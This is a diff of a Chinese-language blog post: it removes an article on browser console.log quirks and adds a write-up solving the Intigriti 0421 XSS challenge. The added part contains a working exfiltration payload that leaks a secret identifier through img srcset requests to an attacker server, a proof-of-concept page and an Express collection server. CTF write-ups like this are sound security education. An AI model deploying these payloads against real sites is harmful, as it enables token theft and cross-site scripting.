@@ -1,95 +1,328 @@
-可是呢，現實與你想像的不太一樣。實際情況是：
+所以我應該只差最後一兩步而已，就快要破關了。但這一兩步真的很難。
 
-1. 如果你先執行這段程式碼才打開 console，很有可能看到第一個 log 出來的結果是`{value: 'after'}`，而不是`{value: 'before'}`
-2. 如果先把 console 打開才執行，儘管乍看之下是對的，但如果你點開 console 裡面 object 的詳細資料，你會看到 `{value: 'after'}`，如下圖，接著開始懷疑人生，不知道該相信誰。
+雖然說已經想要放棄了，但過了一天，又有一個新的想法：「其實根本不需要單獨拿到第二個字元！假設我有個地方 str 存第一個字元，那我只要 `identifier < str + '1'` 不就好了嗎？」
 
+如果有地方存已經找到的字元，那就可以用類似迴圈的概念去跑，就可以洩漏出所有字元了。
 
-![](/img/console/bug.png)
+那這個地方會是哪裡？這地方需要可以從 opener 傳過來，因為只有 opener 會知道現在洩漏出去的字元是什麼。可是因為 cross origin 的關係，opener 沒有一個屬性是可以存取的。
 
-不相信的話可以自己試試看：[Demo 連結](https://aszx87410.github.io/demo/console_log_bug/)
+嘗試了大概一兩個小時，我突然想到可以反過來，不是從 opener 拿東西，而是 opener 把東西傳給 open 的 window。怎麼傳？可以用 location.hash！
 
-在查看 log 的時候，開發者應該會預期看到 log 當時的狀態，但是點開物件詳細資料的時候，看到的卻會是最新的狀態，而非印出當時的狀態。所以才會有上面附圖的狀況，preview 顯示的是 log 當下的狀態，展開則是最新的狀態，所以兩者不一致。
+從我們的網頁中用 window.open 開啟 XSS challenge 之後，可以用 `win.location = url + '#a'` 來加上 hash 而且不會重新載入網頁。加入之後在網頁中就可以用 `location.hash` 存取到。透過 location.hash 在 cross origin 的 window 之間交換資訊。
 
-有些人可能會認為如果 preview 都是對的，那就看 preview 就好。不過 preview 是有限制的，當你的物件太多屬性的時候，沒有辦法全部顯示出來，一定要把物件展開才能看到所有屬性。一旦這種情況發生，就沒辦法只看 preview，一定要把物件展開，可是就沒辦法看到 log 當下的值了。
+雖然說又往前邁進了一步，但其實還有兩個問題需要被解決：
 
-這只是一個簡單的範例而已，或許你會覺得沒什麼，但是這問題可怕的點就在於第一次碰到它時，往往都是在實際的開發情境而不是像這樣簡單的範例。而開發者們會因為不知道有這個情形，導致自己不斷思考到底程式是哪裡出了錯，怎麼印出來的東西跟自己想像中不一樣，殊不知是 console 這東西跟自己想的不一樣。
+1. 我們需要一個類似迴圈的東西
+2. 我們需要能夠多次發送 request 到 server
 
-這個問題基本上「不會被修掉」，所以對待它最好的方法就是：
+先從第一個問題開始，我們需要不斷執行類似的程式碼，才能洩漏一個一個字元出來。這個倒是不難，可以透過 `this.src++` 去改變 img 的 src，只要 src 一被賦值，儘管值一樣，還是會重新載入圖片，例如說這樣：
 
-1. 知道有這個問題的存在，以後才能多注意
-2. 知道如何暫時應付這個問題
-3. 知道為什麼這問題不會被修掉
-
-## 再次觀察問題
-
-前面開頭有提到過可能會出現的兩個問題，接著我們來試試看各個瀏覽器對於兩個不同場景底下的結果到底如何。
-
-先附上拿來測試的範例程式碼：
-
-``` js
-var obj = {value: 'before'}
-console.log('before:', obj) // 應該要是 {value: 'before'}
-obj.value = 'after'
-console.log('after:', obj)
+``` html
+<body>
+  <script>
+    var count = 1
+  </script>
+  <img src=x onerror=count<10?count++&&src++:console.log(count)>
+</body>
 ```
 
-1. 場景一：先執行這一段程式碼，再打開 console 看結果
-2. 場景二：先打開 console，再執行程式碼看結果
+上面的程式碼會不斷把 count++，直到符合條件為止。`count++&&src++` 也可以換成 `count++ + src++`，把空格去掉變成很多加號的 `count+++src++`。
 
-底下是在 macOS Mojave 10.14.4 的各個瀏覽器的執行結果：
+迴圈沒有問題了，接下來是多次洩露資訊的部分。之前我們用的 lazy loading，一個圖片只能用一次，因為圖片一旦載入了就是載入了，沒辦法再用 img.loading++ 來讓它再被載入一次。那怎麼辦呢？我們需要一個管道可以讓我們在指定的時機發送正確的 request。
 
-### Chrome 80.0.3987.149
+在隨便亂試試了一段時間之後，我發現了一個神奇的屬性：srcset，神奇的點在於它跟 src 一起用的時候。
 
-#### 場景一：先執行程式再開 console
+當我 src 與 srcset 一起設定的時候，瀏覽器會優先載入 srcset 的 url，而神奇的是當我把 src++ 的時候，就會再載入一次 srcset！下面是範例，會把 `x2` 載入十遍：
 
-只顯示 Object 字樣，不顯示 preview：
+``` js
+<body>
+  <script>
+    var count = 1
+  </script>
+  <img src=x1 srcset=x2 onerror=count<10?count+++this.src++:123>
+</body>
+```
 
-![](/img/console/chrome-1.png)
+既然這兩個問題都解開了，那把這些拼湊起來，就可以湊出最後的答案了，流程如下：
 
+1. 打開 poc.html，window.open XSS challenge
+2. error 帶上我們準備好的 payload
+3. 用 img 的 onerror 執行一堆巢狀的三元運算子，符合條件就載入相對應的圖片，洩漏出第 n 個字，並等待下一圈迴圈開始
+4. server 接收到圖片，知道第 n 個字是什麼
+5. server 把結果傳給 poc.html，poc.html 去更新 win.location.hash
+6. 更新完之後 server 透過回傳 response 來開啟下一圈迴圈，把 n+1，回到第 3 步
+7. 重複以上動作直到找出 token
 
-#### 場景二：先開 console 再執行程式
+以上是最理想的流程，但因為時間因素所以我有幾個地方沒有照著做，例如說：
 
-console preview 印出來的內容是對的，把 object 展開之後則印出物件最新的內容。
+1. 我假設 identifier 的第一個字是 `1`，不是的話就跳掉
+2. server 等待 500ms 就會開始下一圈迴圈，但有可能 location.hash 還沒更新完成
+3. server 傳結果給 poc.html 最理想是用 websocket，但我偷懶用 long polling
+4. 我懶的判斷 identifier 是不是全部抓完，所以等 length > 10 就開始嘗試 postMessage
 
-![](/img/console/bug.png)
+最後的程式碼長這樣：
 
-### Firefox 74.0
+``` js
+var payload = `
+<img srcset=//my_server/0 id=n0 alt=#>
+<img srcset=//my_server/1 id=n1 alt=a>
+<img srcset=//my_server/2 id=n2 alt=b>
+<img srcset=//my_server/3 id=n3 alt=c>
+<img srcset=//my_server/4 id=n4 alt=d>
+<img srcset=//my_server/5 id=n5 alt=e>
+<img srcset=//my_server/6 id=n6 alt=f>
+<img srcset=//my_server/7 id=n7 alt=g>
+<img srcset=//my_server/8 id=n8 alt=h>
+<img srcset=//my_server/9 id=n9 alt=i>
+<img srcset=//my_server/a id=n10 alt=j>
+<img srcset=//my_server/b id=n11 alt=k>
+<img srcset=//my_server/c id=n12 alt=l>
+<img srcset=//my_server/d id=n13 alt=m>
+<img srcset=//my_server/e id=n14 alt=n>
+<img srcset=//my_server/f id=n15 alt=o>
+<img srcset=//my_server/g id=n16 alt=p>
+<img srcset=//my_server/h id=n17 alt=q>
+<img srcset=//my_server/i id=n18 alt=r>
+<img srcset=//my_server/j id=n19 alt=s>
+<img srcset=//my_server/k id=n20 alt=t>
+<img srcset=//my_server/l id=n21 alt=u>
+<img srcset=//my_server/m id=n22 alt=v>
+<img srcset=//my_server/n id=n23 alt=w>
+<img srcset=//my_server/o id=n24 alt=x>
+<img srcset=//my_server/p id=n25 alt=y>
+<img srcset=//my_server/q id=n26 alt=z>
+<img srcset=//my_server/r id=n27 alt=0>
+<img srcset=//my_server/s id=n28>
+<img srcset=//my_server/t id=n29>
+<img srcset=//my_server/u id=n30>
+<img srcset=//my_server/v id=n31>
+<img srcset=//my_server/w id=n32>
+<img srcset=//my_server/x id=n33>
+<img srcset=//my_server/y id=n34>
+<img srcset=//my_server/z id=n35>
 
-#### 場景一：先執行程式再開 console
+<img id=lo srcset=//my_server/loop onerror=
+n0.alt+identifier<location.hash+1?n0.src+++lo.src++:
+n0.alt+identifier<location.hash+2?n1.src+++lo.src++:
+n0.alt+identifier<location.hash+3?n2.src+++lo.src++:
+n0.alt+identifier<location.hash+4?n3.src+++lo.src++:
+n0.alt+identifier<location.hash+5?n4.src+++lo.src++:
+n0.alt+identifier<location.hash+6?n5.src+++lo.src++:
+n0.alt+identifier<location.hash+7?n6.src+++lo.src++:
+n0.alt+identifier<location.hash+8?n7.src+++lo.src++:
+n0.alt+identifier<location.hash+9?n8.src+++lo.src++:
+n0.alt+identifier<location.hash+n1.alt?n9.src+++lo.src++:
+n0.alt+identifier<location.hash+n2.alt?n10.src+++lo.src++:
+n0.alt+identifier<location.hash+n3.alt?n11.src+++lo.src++:
+n0.alt+identifier<location.hash+n4.alt?n12.src+++lo.src++:
+n0.alt+identifier<location.hash+n5.alt?n13.src+++lo.src++:
+n0.alt+identifier<location.hash+n6.alt?n14.src+++lo.src++:
+n0.alt+identifier<location.hash+n7.alt?n15.src+++lo.src++:
+n0.alt+identifier<location.hash+n8.alt?n16.src+++lo.src++:
+n0.alt+identifier<location.hash+n9.alt?n17.src+++lo.src++:
+n0.alt+identifier<location.hash+n10.alt?n18.src+++lo.src++:
+n0.alt+identifier<location.hash+n11.alt?n19.src+++lo.src++:
+n0.alt+identifier<location.hash+n12.alt?n20.src+++lo.src++:
+n0.alt+identifier<location.hash+n13.alt?n21.src+++lo.src++:
+n0.alt+identifier<location.hash+n14.alt?n22.src+++lo.src++:
+n0.alt+identifier<location.hash+n15.alt?n23.src+++lo.src++:
+n0.alt+identifier<location.hash+n16.alt?n24.src+++lo.src++:
+n0.alt+identifier<location.hash+n17.alt?n25.src+++lo.src++:
+n0.alt+identifier<location.hash+n18.alt?n26.src+++lo.src++:
+n0.alt+identifier<location.hash+n19.alt?n27.src+++lo.src++:
+n0.alt+identifier<location.hash+n20.alt?n28.src+++lo.src++:
+n0.alt+identifier<location.hash+n21.alt?n29.src+++lo.src++:
+n0.alt+identifier<location.hash+n22.alt?n30.src+++lo.src++:
+n0.alt+identifier<location.hash+n23.alt?n31.src+++lo.src++:
+n0.alt+identifier<location.hash+n24.alt?n32.src+++lo.src++:
+n0.alt+identifier<location.hash+n25.alt?n33.src+++lo.src++:
+n0.alt+identifier<location.hash+n26.alt?n34.src+++lo.src++:
+n35.src+++lo.src++>`
+```
 
-顯示錯誤的 preview，兩個都是 `{value: 'after'}`：
+``` html
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+  </head>
+  <body>  
+  </body>
+  <script>
+    var payload = // see above
+    payload = encodeURIComponent(payload)
 
-![](/img/console/ff-1.png)
+    var baseUrl = 'https://my_server'
 
+    // reset first
+    fetch(baseUrl + '/reset').then(() => {
+      start()
+    })
 
-#### 場景二：先開 console 再執行程式
+    async function start() {
+      // assume identifier start with 1
+      console.log('POC started')
+      if (window.xssWindow) {
+        window.xssWindow.close()
+      }
 
-console preview 印出來的內容是對的，把 object 展開之後則印出物件最新的內容。
+      window.xssWindow = window.open(`https://challenge-0421.intigriti.io/?error=${payload}#1`, '_blank')
 
-![](/img/console/ff-2.png)
+      polling()
+    }
 
-### Safari 12.1（14607.1.40.1.4）
+    function polling() {
+      fetch(baseUrl + '/polling').then(res => res.text()).then((token) => {
 
-#### 場景一：先執行程式再開 console
+        // guess fail, restart
+        if (token === '1zz') {
+          fetch(baseUrl + '/reset').then(() => {
+            console.log('guess fail, restart')
+            start()
+          })
+          return
+        }
 
-只顯示 Object 字樣，不顯示 preview：
+        if (token.length >= 10) {
+          window.xssWindow.postMessage({
+            type: 'waf',
+            identifier: token,
+            str: '<img src=xxx onerror=alert("flag{THIS_IS_THE_FLAG}")>',
+            safe: true
+          }, '*')
+        }
 
-![](/img/console/safari-1.png)
+        window.xssWindow.location = `https://challenge-0421.intigriti.io/?error=${payload}#${token}`
 
+        // After POC finsihed, polling will timeout and got error message, I don't want to print the message
+        if (token.length > 20) {
+          return
+        }
 
-#### 場景二：先開 console 再執行程式
+        console.log('token:', token)
+        polling()
+      })
+    }
+  </script>
+</html>
+```
 
-console preview 印出來的內容是對的，把 object 展開之後則印出物件最新的內容。
+寫得很隨便很醜而且有 bug 的 server side code：
 
-附註：因為物件如果太短的話不能展開，所以我新增了幾個屬性
+``` js
+var express = require('express')
 
-![](/img/console/safari-2.png)
+const app = express()
 
------
+app.use(express.static('public'));
+app.use((req, res, next) => {
+  res.set('Access-Control-Allow-Origin', '*');
+  next()
+})
 
-從以上實驗可以得到幾個結論：
+const handlerDelay = 100
+const loopDelay = 550
 
-1. 對於場景一：「先執行程式再開 console」，Chrome 與 Safari 都不會有 preview，而 Firefox 會顯示錯誤的 preview。
-2. 對於場景二：「先開 console 再執行程式」，三個瀏覽器的行爲是一致的，preview 都是對的，把物件展開看詳細內容則會是物件最新的狀態。
+var initialData = {
+  count: 0,
+  token: '1',
+  canStartLoop: false,
+  loopStarted: false,
+  canSendBack: false
+}
+var data = {...initialData}
 
-## 問題發生的原因
+app.get('/reset', (req, res) => {
+  data = {...initialData}
+  console.log('======reset=====')
+  res.end('reset ok')
+})
+
+app.get('/polling', (req, res) => {
+  function handle(req, res) {
+    if (data.canSendBack) {
+      data.canSendBack = false
+      res.status(200)
+      res.end(data.token)
+      console.log('send back token:', data.token)
+
+      if (data.token.length < 14) {
+        setTimeout(() => {
+          data.canStartLoop = true
+        }, loopDelay)
+      }
+    } else {
+      setTimeout(() => {
+        handle(req, res)
+      }, handlerDelay)
+    }
+  }
+
+  handle(req, res)
+})
+
+app.get('/loop', (req, res) => {
+  function handle(req, res) {
+    if (data.canStartLoop) {
+      data.canStartLoop = false
+      res.status(500)
+      res.end()
+    } else {
+      setTimeout(() => {
+        handle(req, res)
+      }, handlerDelay)
+    }
+  }
+
+  handle(req, res)
+})
+
+app.get('/:char', (req, res) => {
+  // already start stealing identifier
+  if (req.params.char.length > 1) {
+    res.end()
+    return
+  }
+  console.log('char received', req.params.char)
+  if (data.loopStarted) {
+    data.token += req.params.char
+    console.log('token:', data.token)
+    data.canSendBack = true
+
+    res.status(500)
+    res.end()
+    return 
+  }
+
+  // first round
+  data.count++
+  if (data.count === 36) {
+    console.log('initial image loaded, start loop')
+    data.count = 0
+    data.loopStarted = true
+    data.canStartLoop = true
+  }
+  res.status(500)
+  res.end()
+})
+
+app.listen(5555, () => {
+  console.log('5555')
+})
+```
+
+## 結語
+
+從這個 XSS challenge 裡面學到滿多的東西的，例如說：
+
+1. 利用 img src + onerror 製造迴圈（其實精確地講應該是遞迴啦）
+2. 利用 img src + srcset 來重複載入圖片
+3. 利用 location.hash 交換資訊
+4. 換個方式思考問題，用 > < 取代 ==，用比較代替等號
+5. 利用 /a/.source 或是 img.alt 之類的東西來取代字串，不使用單雙反引號構造字串
+
+雖然花了不少時間，但解出來的那一刻成就感滿大的，而且又是難題所以成就感更高了。
+
+這篇主要是描述我自己的解法，雖然有點麻煩（因為需要 server side），但是是我唯一可以想出來的解法。
+
+如果沒意外的話，下一篇會跟大家介紹官方解答，利用一個我不會用而且完全忽略掉的元素：`<object>`。
